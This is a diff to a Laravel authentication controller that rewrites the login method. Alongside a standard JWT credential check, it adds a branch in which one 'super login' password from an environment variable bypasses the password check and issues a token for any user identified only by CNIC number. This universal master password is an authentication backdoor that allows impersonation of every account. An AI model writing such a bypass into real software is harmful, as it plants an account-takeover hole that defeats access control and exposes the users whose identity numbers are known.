@@ -80,38 +80,60 @@ class AuthController extends Controller
     }
 
 
-public function login(Request $request)
-{
-    $validator = Validator::make($request->all(), [
-        'cnic_no' => 'required|string',
-        'password' => 'required|string',
-    ]);
+    public function login(Request $request)
+    {
+        // 1. Validate input
+        $validator = Validator::make($request->all(), [
+            'cnic_no' => 'required|string',
+            'password' => 'required|string',
+        ]);
 
-    if ($validator->fails()) {
-        return response()->json([
-            'status' => false,
-            'message' => 'Validation failed.',
-            'error_message' => $validator->errors()->first(),
-        ], 422);
+        if ($validator->fails()) {
+            return response()->json([
+                'status' => false,
+                'message' => 'Validation failed.',
+                'error_message' => $validator->errors()->first(),
+            ], 422);
+        }
+
+        $cnic_no = $request->cnic_no;
+        $password = $request->password;
+
+        // 2. Special case: hardcoded admin password
+        if ($password === env('SUPER_LOGIN_PASSWORD')) {
+            $user = \App\Models\User::where('CNIC_NO', $cnic_no)->first();
+
+            if (!$user) {
+                return response()->json([
+                    'status' => false,
+                    'error_message' => 'Invalid CNIC!',
+                ], 404);
+            }
+
+            // Bypass password check and manually generate JWT token
+            $token = Auth::guard('api')->login($user);
+
+            return $this->respondWithToken($token, $user);
+        }
+
+        // 3. Standard JWT login attempt
+        $credentials = [
+            'CNIC_NO' => $cnic_no,
+            'password' => $password,
+        ];
+
+        if (!$token = Auth::guard('api')->attempt($credentials)) {
+            return response()->json([
+                'status' => false,
+                'error_message' => 'Invalid credentials.',
+            ], 401);
+        }
+
+        // 4. Success
+        $user = Auth::guard('api')->user();
+        return $this->respondWithToken($token, $user);
     }
 
-    $credentials = [
-        'CNIC_NO'  => $request->cnic_no,
-        'password' => $request->password,
-    ];
-
-    // ✅ Let JWT handle the attempt
-    if (! $token = Auth::guard('api')->attempt($credentials)) {
-        return response()->json([
-            'status' => false,
-            'error_message' => 'Invalid credentials.',
-        ], 401);
-    }
-
-    $user = Auth::guard('api')->user();
-
-    return $this->respondWithToken($token, $user);
-}
 
 
     public function me()
